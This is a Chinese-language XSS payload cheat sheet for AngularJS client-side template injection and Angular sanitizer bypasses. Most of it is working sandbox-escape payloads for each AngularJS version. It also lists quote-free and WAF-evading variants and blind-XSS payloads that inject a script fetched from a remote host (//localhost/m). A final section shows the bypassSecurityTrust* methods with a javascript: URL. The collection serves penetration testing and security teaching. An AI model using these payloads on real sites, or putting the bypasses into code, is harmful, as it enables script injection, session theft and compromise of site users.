# Angular 和 AngularJS 下的 XSS

## 客户端模板注入

以下payload基于客户端模板注入。

### AngularJS 中弹框(alert)存储/反射XSS poc

> 从1.6版开始，AngularJS已经完全移除了沙箱

AngularJS 1.6+ poc by [Mario Heiderich](https://twitter.com/cure53berlin)

```javascript
{{constructor.constructor('alert(1)')()}}
```

AngularJS 1.6+  poc  by [@brutelogic](https://twitter.com/brutelogic/status/1031534746084491265)

```javascript
{{[].pop.constructor&#40'alert\u00281\u0029'&#41&#40&#41}}
```

例子 [https://brutelogic.com.br/xss.php](https://brutelogic.com.br/xss.php?a=<brute+ng-app>%7B%7B[].pop.constructor%26%2340%27alert%5Cu00281%5Cu0029%27%26%2341%26%2340%26%2341%7D%7D)

AngularJS 1.6.0 poc  by [@LewisArdern](https://twitter.com/LewisArdern/status/1055887619618471938) & [@garethheyes](https://twitter.com/garethheyes/status/1055884215131213830)

```javascript
{{0[a='constructor'][a]('alert(1)')()}}
{{$eval.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}
```

AngularJS 1.5.9 - 1.5.11 poc  by [Jan Horn](https://twitter.com/tehjh)

```javascript
{{
    c=''.sub.call;b=''.sub.bind;a=''.sub.apply;
    c.$apply=$apply;c.$eval=b;op=$root.$$phase;
    $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;
    C=c.$apply(c);$root.$$phase=op;$root.$digest=od;
    B=C(b,c,b);$evalAsync("
    astNode=pop();astNode.type='UnaryExpression';
    astNode.operator='(window.X?void0:(window.X=true,alert(1)))+';
    astNode.argument={type:'Identifier',name:'foo'};
    ");
    m1=B($$asyncQueue.pop().expression,null,$root);
    m2=B(C,null,m1);[].push.apply=m2;a=''.sub;
    $eval('a(b.c)');[].push.apply=a;
}}
```

AngularJS 1.5.0 - 1.5.8  poc 

```javascript
{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}
```

AngularJS 1.4.0 - 1.4.9  poc 

```javascript
{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
```

AngularJS 1.3.20  poc 

```javascript
{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
```

AngularJS 1.3.19  poc 

```javascript
{{
    'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join;
    $eval('x=alert(1)//');
}}
```

AngularJS 1.3.3 - 1.3.18  poc 

```javascript
{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;
  'a'.constructor.prototype.charAt=[].join;
  $eval('x=alert(1)//');  }}
```

AngularJS 1.3.1 - 1.3.2  poc 

```javascript
{{
    {}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;
    'a'.constructor.prototype.charAt=''.valueOf;
    $eval('x=alert(1)//');
}}
```

AngularJS 1.3.0  poc 

```javascript
{{!ready && (ready = true) && (
      !call
      ? $$watchers[0].get(toString.constructor.prototype)
      : (a = apply) &&
        (apply = constructor) &&
        (valueOf = call) &&
        (''+''.toString(
          'F = Function.prototype;' +
          'F.apply = F.a;' +
          'delete F.a;' +
          'delete F.valueOf;' +
          'alert(1);'
        ))
    );}}
```

AngularJS 1.2.24 - 1.2.29  poc 

```javascript
{{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'");}}
```

AngularJS 1.2.19 - 1.2.23  poc 

```javascript
{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor);}}
```

AngularJS 1.2.6 - 1.2.18  poc 

```javascript
{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}
```

AngularJS 1.2.2 - 1.2.5  poc 

```javascript
{{'a'[{toString:[].join,length:1,0:'__proto__'}].charAt=''.valueOf;$eval("x='"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+"'");}}
```

AngularJS 1.2.0 - 1.2.1  poc 

```javascript
{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}
```

AngularJS 1.0.1 - 1.1.5 和 Vue JS  poc 

```javascript
{{constructor.constructor('alert(1)')()}}
```

### 一些限制绕过的POC

AngularJS (不带单双引号`'` `"` ) by [@Viren](https://twitter.com/VirenPawar_)

```javascript
{{x=valueOf.name.constructor.fromCharCode;constructor.constructor(x(97,108,101,114,116,40,49,41))()}}
```

AngularJS (不带单双引号`'` `"` `constructor` )

```javascript
{{x=767015343;y=50986827;a=x.toString(36)+y.toString(36);b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,toString()[a].fromCharCode(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()}}
```

```javascript
{{x=767015343;y=50986827;a=x.toString(36)+y.toString(36);b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,toString()[a].fromCodePoint(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()}}
```

```javascript
{{x=767015343;y=50986827;a=x.toString(36)+y.toString(36);a.sub.call.call({}[a].getOwnPropertyDescriptor(a.sub.__proto__,a).value,0,toString()[a].fromCharCode(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()}}
```

```javascript
{{x=767015343;y=50986827;a=x.toString(36)+y.toString(36);a.sub.call.call({}[a].getOwnPropertyDescriptor(a.sub.__proto__,a).value,0,toString()[a].fromCodePoint(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()}}
```

AngularJS 绕过waf [Imperva]

```javascript
{{x=['constr', 'uctor'];a=x.join('');b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'pr\\u{6f}mpt(d\\u{6f}cument.d\\u{6f}main)')()}}
```

### 盲打

1.0.1 - 1.1.5 && > 1.6.0 by Mario Heiderich (Cure53)

```javascript
{{
    constructor.constructor("var _ = document.createElement('script');
    _.src='//localhost/m';
    document.getElementsByTagName('body')[0].appendChild(_)")()
}}
```


Shorter 1.0.1 - 1.1.5 && > 1.6.0 by Lewis Ardern (Synopsys) and Gareth Heyes (PortSwigger)

```javascript
{{
    $on.constructor("var _ = document.createElement('script');
    _.src='//localhost/m';
    document.getElementsByTagName('body')[0].appendChild(_)")()
}}
```

1.2.0 - 1.2.5 by Gareth Heyes (PortSwigger)

```javascript
{{
    a="a"["constructor"].prototype;a.charAt=a.trim;
    $eval('a",eval(`var _=document\\x2ecreateElement(\'script\');
    _\\x2esrc=\'//localhost/m\';
    document\\x2ebody\\x2eappendChild(_);`),"')
}}
```

1.2.6 - 1.2.18 by Jan Horn (Cure53, 现在在谷歌Project Zero工作)

```javascript
{{
    (_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'eval("
        var _ = document.createElement(\'script\');
        _.src=\'//localhost/m\';
        document.getElementsByTagName(\'body\')[0].appendChild(_)")')()
}}
```

1.2.19 (FireFox) by Mathias Karlsson

```javascript
{{
    toString.constructor.prototype.toString=toString.constructor.prototype.call;
    ["a",'eval("var _ = document.createElement(\'script\');
    _.src=\'//localhost/m\';
    document.getElementsByTagName(\'body\')[0].appendChild(_)")'].sort(toString.constructor);
}}
```

1.2.20 - 1.2.29 by Gareth Heyes (PortSwigger)

```javascript
{{
    a="a"["constructor"].prototype;a.charAt=a.trim;
    $eval('a",eval(`
    var _=document\\x2ecreateElement(\'script\');
    _\\x2esrc=\'//localhost/m\';
    document\\x2ebody\\x2eappendChild(_);`),"')
}}
```

1.3.0 - 1.3.9 by Gareth Heyes (PortSwigger)

```javascript
{{
    a=toString().constructor.prototype;a.charAt=a.trim;
    $eval('a,eval(`
    var _=document\\x2ecreateElement(\'script\');
    _\\x2esrc=\'//localhost/m\';
    document\\x2ebody\\x2eappendChild(_);`),a')
}}
```

1.4.0 - 1.5.8 by Gareth Heyes (PortSwigger)

```javascript
{{
    a=toString().constructor.prototype;a.charAt=a.trim;
    $eval('a,eval(`var _=document.createElement(\'script\');
    _.src=\'//localhost/m\';document.body.appendChild(_);`),a')
}}
```

1.5.9 - 1.5.11 by Jan Horn (Cure53, 现在在谷歌Project Zero工作)

```javascript
{{
    c=''.sub.call;b=''.sub.bind;a=''.sub.apply;c.$apply=$apply;
    c.$eval=b;op=$root.$$phase;
    $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;
    C=c.$apply(c);$root.$$phase=op;$root.$digest=od;
    B=C(b,c,b);$evalAsync("astNode=pop();astNode.type='UnaryExpression';astNode.operator='(window.X?void0:(window.X=true,eval(`var _=document.createElement(\\'script\\');_.src=\\'//localhost/m\\';document.body.appendChild(_);`)))+';astNode.argument={type:'Identifier',name:'foo'};");
    m1=B($$asyncQueue.pop().expression,null,$root);
    m2=B(C,null,m1);[].push.apply=m2;a=''.sub;
    $eval('a(b.c)');[].push.apply=a;
}}
```

## 自动清理

> 为了系统地阻止XSS漏洞，默认情况下，ANGLE将所有值视为不受信任。当通过属性、属性、样式、类绑定或内插将值从模板插入到DOM中时，ANGLE清理并转义不受信任的值。

但是，可以使用以下方法将值标记为受信任并防止自动清理：

- bypassSecurityTrustHtml
- bypassSecurityTrustScript
- bypassSecurityTrustStyle
- bypassSecurityTrustUrl
- bypassSecurityTrustResourceUrl

使用不安全方法的组件示例 `bypassSecurityTrustUrl`:

```
import { Component, OnInit } from '@angular/core';

@Component({
  selector: 'my-app',
  template: `
    <h4>An untrusted URL:</h4>
    <p><a class="e2e-dangerous-url" [href]="dangerousUrl">Click me</a></p>
    <h4>A trusted URL:</h4>
    <p><a class="e2e-trusted-url" [href]="trustedUrl">Click me</a></p>
  `,
})
export class App {
  constructor(private sanitizer: DomSanitizer) {
    this.dangerousUrl = 'javascript:alert("Hi there")';
    this.trustedUrl = sanitizer.bypassSecurityTrustUrl(this.dangerousUrl);
  }
}
```

![XSS](https://angular.io/generated/images/guide/security/bypass-security-component.png)

在进行代码审计时，不要相信任何用户输入（一切输入都是有害的），因为这会在应用程序中导致安全漏洞。

## 参考

- [不带HTML的XSS - Angular JS 客户端模板注入 - Portswigger](https://portswigger.net/blog/xss-without-html-client-side-template-injection-with-angularjs)
- [AngularJS XSS盲打 Payloads](https://ardern.io/2018/12/07/angularjs-bxss)
- [Angular安全相关](https://angular.io/guide/security)
- [绕过DomSanitizer](https://medium.com/@swarnakishore/angular-safe-pipe-implementation-to-bypass-domsanitizer-stripping-out-content-c1bf0f1cc36b)
